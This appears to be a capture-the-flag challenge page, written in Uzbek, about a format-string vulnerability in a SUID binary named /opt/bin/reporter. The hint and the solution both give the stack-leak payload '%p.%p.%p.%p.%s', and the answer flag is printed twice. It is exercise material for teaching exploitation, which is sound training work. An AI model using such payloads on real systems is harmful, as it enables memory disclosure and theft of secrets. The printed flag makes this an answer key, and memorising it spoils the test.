---
id: 16
title: "CH16: Format String Flag Leak in SUID Binary"
module: "Modul 2: PrivEsc & Binary Exploitation"
difficulty: Hard
points: 9
tags: ['format-string', 'binary-exploitation', 'stack', 'pwn']
flag: "HD{format_string_stack_leak_exploit_916}"
---

# 🎯 Topshiriq #16: CH16: Format String Flag Leak in SUID Binary

## 📌 Metama'lumotlar:
* **Modul:** `Modul 2: PrivEsc & Binary Exploitation`
* **Qiyinlik darajasi:** `🔴 Hard`
* **Maksimal Ball:** `⭐ 9 ball`
* **Teglar:** #format-string, #binary-exploitation, #stack, #pwn

---

## 📝 Topshiriq Senariysi (Scenario):
/opt/bin/reporter binar fayli 'printf(argv[1])' zaifligiga ega. Format string parametrlari (%x, %s, %p) orqali stekda saqlangan maxfiy flag manzilini o'qing.

---

## 💡 Kichik Maslahat (Hint):
> [!TIP]
> /opt/bin/reporter '%p.%p.%p.%p.%s'

---

## 🛠️ Professional Yechim Ko'rsatmasi:
```bash
# Topshiriqni yechish bo'yicha ko'rsatma:
/opt/bin/reporter '%p.%p.%p.%p.%s'
```

---

## 🚩 Maxfiy Flag:
`HD{format_string_stack_leak_exploit_916}`
